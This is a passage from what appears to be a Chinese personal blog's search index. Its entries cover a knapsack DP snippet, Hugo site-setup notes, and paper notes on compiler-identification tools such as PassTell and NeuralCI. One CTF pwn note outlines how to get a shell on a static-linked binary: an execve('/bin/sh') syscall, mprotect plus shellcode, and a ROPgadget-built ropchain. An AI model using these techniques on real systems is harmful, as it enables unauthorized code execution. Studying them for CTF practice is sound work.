cout\u0026lt;\u0026lt;dp[n][v]; return 0; } 优化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; const int N=1005; int n,v; int V[N],W[N]; int dp[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;v; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;V[i]\u0026gt;\u0026gt;W[i]; for(int i=1;i\u0026lt;=n;i++) for(int j=v;j\u0026gt;=V[i];j--) dp[j]=max(dp[j],dp[j-V[i]]+W[i]); cout\u0026lt;\u0026lt;dp[v]; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%97%AB%E6%B0%8Fdp%E5%88%86%E6%9E%90%E6%B3%95/","summary":"题干：N 个物品，每个物品有对应的价值和体积，背包容量为 V，如何选择物品使得在不超过背包容量的前提下，价值之和最大。 每个物品都可以选和不选，两","title":"闫氏DP分析法"},{"content":" 利用int 80h系统调用 设置系统调用参数即可执行 execve(\u0026quot;\\bin\\sh\u0026quot;,0,0)，获取shell ，四个参数分别是 eax、ebx、ecx、edx 使用 mprotect 方法修改bss段, 执行shellcode 借助ROPgadget工具自动生成ropchain，ROPgadget --binary simplerop --ropchain 但是这种方法生成的ropchain太长，可能无法全部输入 例题：cmcc_simplerop（write up） (80条消息) BUUCTF：cmcc_simplerop（write up）_　筱的博客-CSDN博客 (80条消息) CMCC\u0026ndash;simplerop 题解_cmcc simplerop___lifanxin的博客-CSDN博客\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"利用int 80h系统调用 设置系统调用参数即可执行 execve(\u0026quot;\\bin\\sh\u0026quot;,0,0)，获取shell ，四个参数分别","title":"静态链接栈溢出"},{"content":"TODO 写更新脚本 添加一个category 部署到服务器上 图片加载不出来 皮肤也不对 公式不渲染 实现侧边栏 实现搜索 实现评论 更新 2023.6.30 图片加载不出来是因为gitee有防盗链，之后就拿github当图床吧 markdown换行的标准写法是两个空格+一个换行 公式正常渲染了 2023.7.1 进行了一系列细小的更新 增加了主页面的两个button 增加了search功能 增加了友链 参考 hugo配置说明 Hello Hugo - Codec Labs PaperMod 折腾记 | 限时活跃 (feyesu.gitlab.io) Hugo + PaperMod搭建技术博客 | Kunyang\u0026rsquo;s Blog (kyxie.github.io) [置顶] hugo博客搭建 | PaperMod主题 | Sulv\u0026rsquo;s Blog (sulvblog. cn) 关于后续如果要添加新的页面，可以参考这篇博客 关于换行 1 2 3 4 5 6 [markup] defaultMarkdownHandler = \u0026#34;goldmark\u0026#34; [markup.goldmark] [markup.goldmark.renderer] unsafe = true 将上述参数添加到配置文件中，hugo将支持使用\u0026lt;br/\u0026gt;换行 然后markdown的换行是两个空格+回车。这样转成html才会是换行。\n头模板 1 2 3 4 5 6 title: \u0026#34;建站第一天\u0026#34; date: 2023-06-11T02:01:58+05:30 description: 建站小tips math: true tags: [建站] categories: [123] papermod的头模板\n1 2 3 4 5 6 7 8 9 10 11 title: \u0026#34;{{ replace .TranslationBaseName \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; slug: \u0026#34;\u0026#34; # 配合 config.toml 中的 permalinks 参数，自定义文章链接 description: \u0026#34;\u0026#34; # 显示在文章标题下，与 summary 不同 summary: \u0026#34;\u0026#34; # 文章摘要 date: {{ .Date }} lastmod: {{ .Date }} draft: false showToc: true categories: [\u0026#34;\u0026#34;] tags: [\u0026#34;\u0026#34;] weight: # 输入1可以顶置文章，用来给文章展示排序，不填就默认按时间排序 tags：论文阅读、论文复现\ncategories：二进制编译优化分析、模糊测试\n公式渲染测试 $ErrSeq = [ErrPt1, ErrPt2, \u0026hellip;, ErrPtx], ErrPti = {0, 1}$ $$ \\tfrac{x}{y\\rhd} \\omega \\lim q $$\n","permalink":"https://juhuax.github.io/posts/%E5%BB%BA%E7%AB%99/%E5%BB%BA%E7%AB%99/","summary":"TODO 写更新脚本 添加一个category 部署到服务器上 图片加载不出来 皮肤也不对 公式不渲染 实现侧边栏 实现搜索 实现评论 更新 2023.6.30 图片加载不出来是因为gi","title":"建站"},{"content":"中文译名：二进制级细粒度编译器工件的自动恢复 作者：Yufei Du 单位：北卡罗来纳大学教堂山分校 国家： #美国 年份： #2022年 来源： #USENIX会议 关键字： #二进制 #编译 #神经网络 代码地址：GitHub - zeropointdynamics/passtell 笔记建立时间： 2023-02-11 09:45\n摘要 识别二进制编译器配置使开发人员和分析人员能够定位由优化副作用引起的潜在安全问题，识别二进制克隆，并构建兼容的二进制补丁。 现有的工作重点是使用语义特征和深度学习技术识别编译器家族、版本和优化级别。 本文想要探索恢复二进制文件中每个函数的单独的、细粒度的优化传递。为此，我们开发了一种使用专门设计的功能以及直观和可理解的机器学习模型的方法。 引言 编译器的优化可能带来安全方面的负面影响 死代码消除优化可以删除使用敏感数据后擦除敏感数据的指令，导致敏感数据容易泄露 用更高效的操作取代昂贵操作的强度降低优化可以打开侧通道 避免这些陷阱的一种方法是让开发人员手动调整编译脚本 具有挑战性和耗时的 一些编译器还包含无法手动控制的隐藏优化 现代编译器的代码库太大，用户无法查看和研究优化背后的逻辑 安全关键项目 (如 OpenSSL 和 mbed TLS) 的开发人员采取了另一种方法，即在安全函数的源代码中实现工作区，以“迷惑”编译器，使其不会对安全代码应用优化 但是不能一劳永逸，不适用于未来的编译器版本 除了安全性验证外，编译器优化分类还会影响二进制代码克隆检测和二进制补丁。 编译器配置会导致克隆检测技术性能的显著下降 二进制补丁中，在存在某些编译器优化时，定位要修补的易受攻击函数变得更加困难 当前技术侧重于识别编译器家族、主要编译器版本以及二进制文件的优化级别 缺少更详细的信息，即可能已应用的传递 当前方法依赖于语义特征（列如控制流图）或者采用深度学习的方法 为了输出的可解释性，作者选择了使用具有特殊设计功能的浅层学习。 作者的方法成为 passtell，可以识别影响单个函数安全的优化过程 总结：因为编译器的优化会产生一些意想不到的负面影响，包括安全问题、克隆检测技术性能下降和难以定位补丁函数。所以要有一种技术来检测编译器的优化？目前的技术侧重于识别识别编译器家族、主要编译器版本以及二进制文件的优化级别，缺少更详细的信息。作者提出的方法可以识别函数级的优化过程，提供更详细的优化信息。\n背景 编译优化 知道二进制文件的优化级别不足以确定应用于二进制文件的精确优化集。 因为除了用户指定的优化级别外，在决定要运行的传递时，传递管理器还考虑多个因素，包括目标体系结构、目标处理器生成和源代码结构。 安全影响 持久状态违反是指数据持续存在于其设计的可用范围之外。\nD’silva et al.[3]列出了三种可能导致这种违规的优化: 死代码消除、函数内联和代码移动。 在密码验证函数中，密码在验证期间临时存储在内存中，编译器可能会认为擦除本地内存的操作是死代码并将其删除，导致密码在使用后仍存在于内存中，直到最终被后面的函数覆盖。 如果受信任的安全敏感函数内联在不受信任的函数中，则受信任函数的局部变量的生存期将扩展到不受信任函数返回时。 代码移动可以切换指令的顺序，以避免不必要的计算或改善局部性。这种优化可能会导致程序在验证操作是否需要之前将敏感值写入内存。 侧通道攻击：为了避免侧通道，开发人员可能会向函数中添加不必要或低效的操作，但优化可能会简化或删除这些操作，从而重新引入侧通道。\nD’silva et al.[3]列出了三种可能引入侧通道的优化方法: 公共子表达式消除，将多个指令合并为一条指令以避免重复计算; 强度降低，用更有效的指令取代昂贵的指令， 窥视孔优化，检查周围的指令，以寻找重新排序或替换指令的机会，以简化计算或更好的局部性。 本文的工作重点是识别上述两种优化。\n相关工作 Rosenblum 等人在二进制文件的编译器识别领域做出了开创性的工作。他们的方法侧重于使用概率图形模型仅识别 IA-32 体系结构中代码片段的编译器家族。后来，Rosenblum et al.[17]扩展了这项工作，并提出了 Origin，这是一个工具，用于标识二进制文件中每个函数的编译器族、编译器版本和优化级别。Origin 使用线性支持向量机模型，其特征包括指令的习惯用法、控制流图的子图和函数的高级布局 (如起始地址)。然而，对于优化级别，Origin 只能执行粗粒度识别，有两个选项:-O0， -O1 为“low”，-O2， -O3 为“high”。 几年后，Rahimian 等人[16]提出了一种不同的编译器来源识别方法 (称为 BinComp)。BinComp 的重点是识别整个二进制文件的编译器族、编译器版本和优化级别。与 Origin 不同，BinComp 大量利用从编译器添加的实用函数中提取的特性来识别编译器版本和优化级别。这些实用程序函数包括程序初始化、启动代码和终止代码。虽然这些函数可以高度指示优化级别，但不可能对二进制文件中的每个函数执行识别。因此，BinComp 只能识别用于编译程序主例程的编译器配置。 最近在编译器来源识别方面的工作[2, 15, 20, 23]开始使用神经网络进行分类。Chen 等人[2]提出了 HIMALIA，这是一种使用递归神经网络来识别二进制的每个函数的优化水平的分类器。HIMALIA 使用分解指令的向量作为特征，并使用两个递归神经网络进行分类。一个网络将函数分为四类之一:-O0， -O1， -O2/O3 和- o; 另一个网络则区分-O2 和-O3。虽然 HIMALIA 的评估包括用不同版本的 LLVM Clang 编译器编译的二进制文件，但它只关注于确定每个函数的优化级别，而不区分应用于不同编译器版本的优化。Yang 等人[23]提出了 BinEye，这是一个使用卷积神经网络来识别 ARM 二进制文件中每个对象的优化级别的分类器。由于 ARM 架构中的每条指令都是 4 个字节，BinEye 使用每个对象的前 1024 条指令作为原始特征，并从中提取单词和位置嵌入。Tian 等人[20]提出了 NeuralCI，这是一种具有卷积神经网络或递归神经网络的分类器，用于识别二进制文件中每个函数的编译器族、编译器版本和优化级别。NeuralCI 使用 Word2Vec[14]嵌入允许可变大小的指令。与 BinEye 类似，NeuralCI 的评估将-O2 和-O3 合并为一个粗粒度的 OH 优化水平。 最近，Pizzolotto 和 Inoue 提出了一种方法，使用卷积神经网络或长短期内存网络来识别 7 种不同架构中 2KB 代码片段的编译器家族和优化级别。这种方法包括原始字节或操作码作为特征，但得出的结论是，当有大量可用的训练数据时，原始字节会导致更好的结果。与 HIMALIA 类似，这种方法的评估包括五个不同的优化级别:-O0， -O1， -O2， -O3 和-Os。由于 NeuralCI 进行了最深入和最现实的评估，并且它优于其他在函数级进行分类的方法，因此我们在本文后面选择它进行比较。\n方法 PassTell，一种用于识别可能应用于二进制文件中的每个函数的优化传递集的方法。 数据生成 首先，编写不同优化级别的程序，并记录应用于每个函数的优化列表 然后，分解二进制来检索每个函数的指令 最后，通过删除详细的内存地址、调用目标和直接值来净化指令 收集在编译期间修改函数的优化传递：因为 clang 可以列出编译期间应用于每个函数的优化，输出运行的所有传递，作者基于此进行修改以便于提取编译期间修改函数的优化通道 指令消毒：用 “mem”标签替换所有内存地址，用 “TARGET”替换所有调用目标，用“imm”替换所有即时值。我们做出这样的调整是因为详细的内存地址、即时值和调用目标在不同的程序中是高度可变的，在优化分类中没有用处。 总结：这部分对应 disassembler 操作，主要是将编译好的二进制文件分解成指令，然后对指令进行消毒，用于后面的特征提取。\n动态特征生成 作为扩展，本文还提出了一种提取寄存器值变化 (通过仿真恢复) 的方法，并在分类器中使用这些动态特征。 目前，动态特性只包括寄存器增量。 加入这个动态特征的目的是为了探索它们提高分类精度的潜力。寄存器中的一些变化是隐式的，或许可以有助于分类器分类。\n特征提取 默认情况下，我们使用七种类型的静态特性: 操作码、指令、寄存器、二元操作码、二元指令以及函数的第一条和最后一条指令。寄存器值 delta 是一个可选特性。\n特征选择：从指令、二元操作码、二元指令、寄存器值的变化这四种特征类型中每种选择 1000 个特征，用于每次优化 策略：首先，我们过滤数据集，使其在优化过程中保持平衡 (即，经过优化的函数数量和未经过优化的函数数量是相同的); 其次，我们根据平衡数据集中至少出现一次该特征的函数的数量对特征进行排序; 最后，我们选择每种类型的 1000 个最常见的特征。 对于其他特征类型，包括操作码、寄存器、第一条指令和最后一条指令，我们使用这些类型中的所有特征而不应用特征选择，因为这些类型中的特征较少。 所有特性都是二进制值。也就是说，我们检查函数是否具有这个特性。例如，在循环中执行算术运算的叶函数 (即不调用任何其他函数的函数) 对于操作码特征调用应该为 0，因为它不包括任何调用; 对于操作码特征测试，它可能为 1，因为它可能使用测试指令来确定循环的结束条件。？这段没看懂 总结：主要介绍了特征提取的策略\n分类 在生成特征集之后，我们训练分类器进行优化分类。对于每个优化，我们训练一个二进制 LightGBM 分类器[9]，它决定一个函数是否被这个单一优化修改。\nLightGBM 是一种梯度增强决策树的实现。本文选择这个分类器而不是深度学习技术有两个原因。 现代编译器包含大量的传递。每个传递都需要一个单独的二进制分类器，所以面对庞大的数据集，分类器应该足够轻量，在在训练时间和内存消耗方面都能很好地扩展。 像支持向量机和神经网络这样的分类器不能轻易地证明特征的推理或重要性。另一方面，基于决策树的分类器可以更容易地显示特征的推理和重要性。（这里可以理解为基于决策树的分类器的结果可接受性更强？） 在训练阶段，生成所有优化传递的列表，并为每个优化传递创建模型。每个优化传递都对应这一个分类器，该分类器可以揭示函数是否应用了分类器对应的优化传递。\n实施 数据集生成 用 Python 实现了数据集生成组件。采用源代码存储库，使用四个优化级别 (-O0、-O1、-O2 和-O3) 对其进行编译。 编译时从编译器日志中提取每个函数的优化传递 编译后用 objdump 分解二进制文件 通过删除详细的内存地址、调用目标和立即值对指令进行消毒。 在 LLVM 的遗留传递管理器的现有输出标志中添加了一个选项，以列出修改函数或函数内组件 (例如，循环) 的优化传递。 动态特征生成 使用 Zelos ，一个基于 python 的二进制仿真器平台，对二进制文件中的每个函数进行强制模拟，并在函数边界内的每条指令之后记录寄存器值的变化。 特征提取和分类 为了提高效率，本文将静态和动态特征的提取阶段和分类器结合到一个分类器组件中。 我们使用 Python 和 LightGBM 库实现了我们的分类器。分类器遍历每个优化过程，选择并提取特征，然后创建一个 LGBMClassifier。在训练时，分类器首先过滤数据集，使数据集平衡，具有相同数量的正数据和负数据。然后，分类器选择第 4.3 节中描述的最流行的特征，提取静态和动态特征，并训练 LGBMClassifier。分类器在进行分类时，提取静态和动态特征，并使用 LGBMClassifier 来预测该函数是否在此优化过程中被修改。在分类器提取特征并对所有优化过程进行分类之后，它将结果合并在一起以生成最终结果，即应用于函数的优化列表。 评价 编译器配置识别 对于编译器族、编译器版本和优化级别的识别，NeuralCI 实现了 76.6%的平均 F-1 评分，而我们的方法实现了 83.2%的平均 F-1 评分。我们对 NeuralCI 的重新实现产生了较低的结果，如他们的论文[20]所报道的那样。我们将这种变化归因于正确平衡的数据集。总的来说，结果表明我们的方法在识别编译器家族、主要编译器版本和优化级别方面比 NeuralCI 表现得更好。 实验表明识别用 Clang 编译的二进制文件的优化级别和编译器版本更具挑战性。而对于对于 GCC 和 ICC 构建的函数，这两种方法在识别编译器族、编译器版本和优化级别方面都达到了很高的精度。 优化传递识别 总的来说，我们的方法达到了平均 92.1%的 F-1 分数。 研究结果进一步表明，与 Pizzolotto 和 Inoue[15]的说法相反，即使是看起来不太可能被检测到的传递，比如死代码消除，也可以被高精度地识别出来。 优化诱发漏洞案例研究 略\nThe Effects of the Dynamic Features 局限性 没有研究应用于较大单元 (如模块和调用图) 的优化传递。 我们的数据收集组件不支持在链接时提取应用的整个程序优化 我们的方法只针对编译器直接生成的二进制文件。因此，它不能用于编译后修改二进制文件的情况，例如混淆的二进制文件或应用了二进制补丁的二进制文件。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level/","summary":"中文译名：二进制级细粒度编译器工件的自动恢复 作者：Yufei Du 单位：北卡罗来纳大学教堂山分校 国家： #美国 年份： #2022年 来源： #USENI","title":"Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level"},{"content":"[[Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level]] GitHub 地址：zeropointdynamics/passtell (github.com)\n数据集结构 passtell_dataset. tar. xz ：PassTell 实验中使用的数据集的存档，包括: \u0026rsquo; balanced_dataset. csv \u0026lsquo;: 用于粗粒度编译器配置分类的数据集。如第 6.1 节所述，此数据集是 NeuralCI 中使用的数据集的平衡子集。 用于 6.1 节的实验——编译器配置识别 数据集由数据集中所有动态链接的未分解的可执行文件组成，包括 binutils、busybox、coreutils、curl、ffmpeg、git、gsl、libpng、openssl、postgresql、sqlite、valgrind、vim、zlib 和 gdb。 \u0026rsquo; data. csv \u0026lsquo;: 用于 6.2 节中使用的细粒度编译器传递分类的数据集。 用于 6.2 节实验——优化传递识别 编译器传递数据集由来自用 Clang 14 编译的 binutils (2.37)、coreutils (9.0)、httpd (2.4.51) 和 sqlite (3.36.0) 程序的函数组成，使用-O0、-O1、-O2 和-O3 优化级别，在 552 个二进制文件中生成总共 149, 814 个函数。然后，我们为每一次传递平衡数据集: 对于每一次传递，我们随机选择等量的应用了传递的函数 (即正样本) 和没有应用传递的函数 (即负样本)。我们还将每次传递的最大样本数量限制为 5, 000 个正样本和 5, 000 个负样本。 \u0026rsquo; data_dynamic. Csv \u0026lsquo;: 第 6.4 节中用于动态特征评估的数据集。如第 6.4 节所述，此数据集是\u0026rsquo; data. Csv \u0026lsquo;的子集，仅包含动态特征覆盖率至少为 70%的函数。 6.4 节的实验——动态特征的效果 使用与第 6.2 节相同的数据集，但应用了额外的过滤。具体来说，因为我们的动态特征生成器的当前实现无法为数据集中的所有函数生成注册特征，所以我们对数据集进行筛选，只包括生成器达到最小覆盖阈值的函数。为了与基线进行比较，我们同时使用静态特征和动态特征来运行我们的方法。对于后者，我们将覆盖率阈值设置为 30%到 60%。对于这些配置，我们使用相同的过滤数据集，并人为地删除动态特征以达到目标覆盖率。 \u0026rsquo; config_classifier. py \u0026lsquo;: 粗粒度的编译器配置分类器。For 6.1 节 \u0026rsquo; passtel . py \u0026lsquo;: 细粒度的编译器传递分类器。For 6.2 节 \u0026rsquo; static_opcode_features. py \u0026lsquo;: \u0026rsquo; passtel . py \u0026lsquo;所需的库模块。 For 6.4 节 依赖 64 位 Linux 机器，至少有 32GB RAM 和 16GB 存储空间。我们已经在 Arch Linux (滚动发布，于 2022 年 5 月更新)，Ubuntu 20.04 (Windows Subsystem for Linux) 和 Fedora Workstation 36 上测试了我们的工件。 Python 3。对于 Ubuntu 和其他没有默认\u0026rsquo; python \u0026lsquo;命令的 Linux 发行版，需要将符号链接从\u0026rsquo; python \u0026lsquo;设置为\u0026rsquo; python3 \u0026lsquo;。在 Ubuntu 上，这可以通过安装\u0026rsquo; python-is-python3 \u0026lsquo;包来实现。一些发行版 (如 Fedora) 没有 Python C API，还需要安装 Python C API。在 Fedora 上，可以通过安装\u0026rsquo; python3-devel \u0026lsquo;包来实现。 Graphviz。 \u0026rsquo; requirements. txt \u0026lsquo;中包含的 Python 库。这些库可以使用命令\u0026rsquo; pip install -r requirements. txt \u0026lsquo;安装。 运行 概述 运行粗粒度分类器 要重现第 6.1 节的结果，请运行 python config_classifier.py。我们使用 LightGBM 的 MLJAR AutoML 包装器来方便地再现混淆矩阵。由于\u0026rsquo; numpy \u0026lsquo;版本号不同，分类器可能会报告错误，但这些错误不会影响分类。一旦分类器终止，F-1 分数可以在\u0026rsquo; automl1 /README 中找到。md \u0026lsquo;作为\u0026rsquo; metric_value \u0026lsquo;，规范化的混淆矩阵 (图 2) 可以在\u0026rsquo; AutoML_1/ 1_Default_LightGBM/confusion_matrix_normalized. png \u0026lsquo;中找到。 注意，虽然第 6.1 节也包括了来自 NeuralCI 的结果，但 NeuralCI 的代码并不是我们工件的一部分。\n运行细粒度分类器 Static Features 要重现 6.2 节的结果，请运行 python passtell.py --train_csv data.csv。程序结束后，分类结果可以在 passtell_model/pass_classification_results.csv 中找到。“passtell_model”目录中还包含了显示每次传递的主要特性的图形。请注意，由于随机训练和测试集的分裂、分类器中的修复以及库的不同版本，训练和测试样本的数量可能会有微小的变化。同样，由于随机化的训练集，每一次传递的确切顶部特征可能与我们在论文中展示的顶部特征不同 (图 4 和图 5)。但是，分类结果应该是相似的，应该仍然支持我们在论文中的发现。\nStatic Features 要使用第 6.4 节的静态和动态特性重现结果，请运行 python passtell.py --train_csv data_dynamic.csv --dynamic。请注意，分类器总是会覆盖结果目录\u0026rsquo; passtell_model \u0026lsquo;，所以如果需要，请在运行新的实验之前备份之前的\u0026rsquo; passtell_model \u0026lsquo;目录。为了只使用章节 6.4 的静态特征生成结果，再次运行分类器，不带 --dynamic 标志。\n对额外二进制文件进行分类 在使用 --train_csv 选项训练模型之后，PassTell 可以使用 --tell 选项对任何二进制文件进行分类 (例如，\u0026rsquo; PassTell——tell my_binary——output results. csv \u0026lsquo;)。输出 CSV 文件包括它为每个函数检测到的编译器通道。注意，由于分类器使用\u0026rsquo; objdump \u0026lsquo;来反编译二进制文件，因此二进制文件必须包含调试符号。\n结果说明 6.2 的结果文件是 pass_classification_results. csv。文件中每一行表示一种 pass 种类，每一行的属性有样例个数，精度召回率和最高的 15 个特征，也就是说程序通过这 15 个或者更多个特征来判定函数属于哪个优化 pass 6.4 的实验结果和 6.2 相同，它的目的是为了比较增加了动态特征（寄存器变化）对结果的影响，所以就是对同样的数据运行两次程序，一次加动态特征，一次不加，然后比较 F1。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level%E5%A4%8D%E7%8E%B0/","summary":"[[Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level]] GitHub 地址：zeropointdynamics/passtell (github.com) 数据集结构 passtell_dataset. tar. xz ：PassTell 实验中使用的数据集的存档","title":"Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level复现"},{"content":"中文译名：基于面向序列的神经模型的细粒度编译器识别 作者：ZHENZHOU TIAN 单位： 西安邮电大学 国家： #中国 年份： #2021年 来源： #IEEE_ACCESS 关键字： #编译 #神经网络 #二进制 代码地址：zztian007/NeuralCI (github.com) 笔记建立时间： 2023-02-23 15:37\n摘要 现有的大多数方法都采用基于特征匹配或基于机器学习的策略来识别编译器细节，在检测精度或粒度上都有限制。 在这项工作中，我们提出了 NeuralCI (基于神经建模的编译器识别) 来推断这些编译器细节，包括编译器家族、优化级别和单个函数的编译器版本。 其基本思想是建立面向序列的神经网络来处理使用轻量级函数抽象策略生成的规范化指令序列。 为了评估 NeuralCI 的性能，构建了一个由从 19 个广泛使用的现实项目中收集的 854, 858 个独特函数组成的大型数据集。 实验表明，NeuralCI 识别编译器族的平均准确率为 98.6%， 识别优化级别的平均准确率为 95.3%， 识别编译器版本的平均准确率为 88.7%， 识别编译器族和优化级别的平均准确率为 94.8%， 同时识别所有编译器组件的平均准确率为 83.0%，在检测精度和全面性方面均优于现有的功能级编译器识别方法。 1引言 编译器识别方面的研究相对较少，主要分为两类:\n基于签名匹配的方法[6]-[8] 在一些逆向工程工具中实现，如 IDA[6]和 PEiD[8]，通过匹配通用签名和刚性签名的语料库来执行整个程序级别的识别。 这些方法的缺点是在构造足够好的特定于编译器的签名时需要严格的专业知识，以及它们的粗标识粒度。 和基于学习的方法[27]-[29]，[39]。 后者将编译器识别定义为机器学习任务，训练模型以捕获特定于编译器的模式，并根据以前未见过的二进制文件推断编译器细节。 对于这类方法，语法或结构特征是基于人工定义的模板提取的，例如 idioms[29]，它是带有通配符的短指令序列，或者 graphlets[28]，它是 CFG (控制流图) 中的小子图。作为典型的基于特征工程的方法，其有效性在很大程度上取决于专家定义的特征提取模板的质量，而专家定义的特征提取模板需要更多的领域特定知识。 具体来说，我们为典型的卷积神经网络 (CNN) 和循环神经网络 (RNN) 结构提供标准化的汇编指令序列，以训练分类模型，用于推断编译器族、优化级别和编译器版本。我们的直觉是基于这样的观察: 共出现的指令及其在短指令序列中的顺序形成了足够好的信号，可以区分不同的编译器或优化级别，这可以被神经模型基本上捕捉到。\n2 问题定义和设计概述 A 问题概述 略\nB 问题定义 定义 1：给定一个二进制形式的个别函数 f，并剥离其调试和符号信息，我们通过一组学习模型 M 来推断编译这个函数的编译器设置 D。 操作对象是单个函数 设置 D 包括编译器系列、优化级别、编译器版本或它们的组合（例如编译器系列和优化级别都有） C 设计概览 训练阶段 (上图) 第一步是构建一个由标记函数组成的高质量数据集 第二步将每个原始函数作为输入，并通过函数抽象模块中实现的轻量级抽象策略输出规范化的指令序列。 第三步将这些归一化序列及其真实值标签输入到基于神经网络的分类模块中，训练编译器识别模型。 检测阶段 (下图)。 检测阶段读入一个单独的函数，用函数抽象处理它，并利用训练过的模型来产生预测。 3 函数抽象 函数的抽象表示方法包括使用原始字节序列、汇编指令序列或控制流图 因为有相关工作表明短汇编指令序列成功地捕获了编译器相关的特性，所以我们选择使用函数体中的汇编指令序列作为每个函数的表示。 函数 f 表示为一个序列 $Sf = {ins1, ins2，···，insn}$，其中 n 表示函数内的指令数 每个汇编指令 insi 由一个操作码 (即助记符) 和一个有序的操作数列表组成 同样，该序列确保 $∀i, j∈[1, n]， addr (ins_j) \u0026gt; addr (ins_i)$ 如果 j \u0026gt; i，其中 addr (insi) 返回 insi 的地址。 但是同样有相关工作认为直接处理原始汇编指令是不明智的。 本文希望捕获反映编辑器细节的特性而不是函数功能 使用函数中出现的所有指令可能会让我们沉浸在太多的功能细节中，这可能会相应地增加表示学习的复杂性，降低指令嵌入阶段的嵌入质量 (因为保留了太多不同的指令)，也会分散后续神经网络训练的注意力。另一方面，对指令的过度规范化将引入大量无意的人为偏差，并导致某些微妙但重要的特征的丢失 因此选择使用轻量级抽象策略来处理原始指令 助记符保持不变。 操作数中的所有寄存器保持不变。 操作数中的所有基内存地址都替换为符号 MEM。 所有绝对值低于特定阈值 (在当前设计中设置为 5000) 的孤立的立即数都保持不变，而在所有其他情况下，操作数中的立即数都用符号 IMM 代替。 4 识别编译器的神经模型 A指令嵌入 对于神经网络的输入，我们需要将汇编指令序列转化为数值向量 首先使用词嵌入为每条唯一的指令分配一个向量，然后在此基础上对整个指令序列建模和表示。 独热编码太稀疏，在计算上不可行，并且通常需要与后续的神经网络一起联合学习，使得所学习的单词语义显着具有任务特定性。 NeuralCI 利用流行的 skip-gram 模型，以独立且无监督的方式学习更紧凑的向量表示，这些向量表示具有指令共现关系和词汇语义，以便在其他二进制分析任务中可以重复使用学习的向量。 具体而言，我们将每个基本块视为一个句子，并将基本块中的每个规范化指令视为一个单词，并将我们二进制收集的所有基本块馈送到 skip-gram 模型中，以通过最小化观察指令邻域（在窗口 w 内）的损失来学习每个唯一指令的 d 维向量，以其当前嵌入作为条件。skip-gram 的目标函数可以定义为 我们训练嵌入模型 100 个 epoch，学习率为 0.001，上下文窗口大小 w 为 5。 B 神经网络模型 Skip-gram 模型的限制：\n为每个指令分配一个静态嵌入向量，不是上下文感知 由于指令序列是从函数中抽象出来的，因此它们可能不仅享有本地指令相关性，还可能具有全局或 long-range 指令依赖性。（啥意思） 需要靠序列学习模型来更好地从指令序列中捕获表达编译器特定模式和特征的信息以进行编译器识别。\n1）CNN CNN 能够关注那些在短序列中频繁出现的指令。在我们的模型公式中，我们进一步利用了不同的内核大小滤波器来全面提取不同指令 gram 之间的相互作用的显着特征，以捕捉编译器的行为。 在指令序列的基础上，将每个指令序列首先转换为原始特征矩阵 $A \\in R^{l \\times d}$，其中 $l$ 是序列长度，$d$ 是指令嵌入维度。 其中，$e_i \\in R^d$ 是序列中指令 $ins_i$ 的对应嵌入。然后，在卷积层中，采用了 $k$ 个形状为 $n \\times d$ 的卷积滤波器对原始特征矩阵 $A$ 进行卷积操作，得到新的特征矩阵 $c \\in R(l-n+1) \\times k$，其中 $n$ 表示卷积核大小。为了提取特征模式的不同视图，我们使用大小分别为 2、3 和 4 的不同卷积核将 $A$ 进行卷积（分别类比于 2、3 和 4 个指令克隆），然后通过 1D 最大池化层进行维数降低。最终的表示通过稠密层连接起来，馈送到 softmax 层进行编译器预测。 在输入层和卷积层之间引入了一个注意力层，引入这样一个注意力层的直觉是为了捕捉长期的上下文信息和非连续指令之间的相关性。 (这部分注意力机制看不懂，挖个坑，先去补补课) 对于两种注意机制，NeuralCI 将从注意力层输出的向量与初始嵌入向量串联为新的表示形式，以进一步处理卷积和后续层。为了简化起见，我们在实验评估中用 NeuralBS CNN，NeuralSD CNN 和 NeuralAD CNN 来表示基础 CNN，带有缩放点积注意力的增强 CNN 和带有附加注意力的增强 CNN。\n2）RNN RNN 的特点在于可以学习顺序依赖性，可以捕捉到指令之间的 long-range 依赖关系。 门控循环单元用于解决 RNN 的梯度消失/爆炸问题 上图是 RNN 结构，通过 GRU 单元对输入矩阵进行读取，在每个时间步 i 上生成隐藏向量状态 hi 进行各种非线性变换。 在 GRU 的基础上改进的双向 GRU（BiGRU）通过正向和反向状态捕获先前和未来时间步长特征，利用相互反转的两个 GRU 单元处理序列。捕获指令序列中的前向和后向顺序依赖性和全局上下文信息。 在正向和反向读取整个输入序列之后 A 结构将最后的时间步的隐藏状态 hi 送入后续的密集层和 softmax 层 B 结构和 C 结构引入了注意力层，关注部分信息指令（可能更重要的用于编译器识别）而不是平等地关注所有指令。B 使用 CNN 中的两种注意力机制中的一种生成注意力向量。C 选择了另一种注意力机制，引入了每个句子中的单词的重要性机制 为了使这些 RNN 模型可区分，我们在以下实验评估中使用 NeuralBS GRU，NeuralSD GRU，NeuralAD GRU 和 NeuralQU GRU（第三种注意机制最令人印象深刻的特征是引入外部查询向量，因此我们将其简称为 QUerybased-attention）。 V 实验和评估 A 数据集的构建 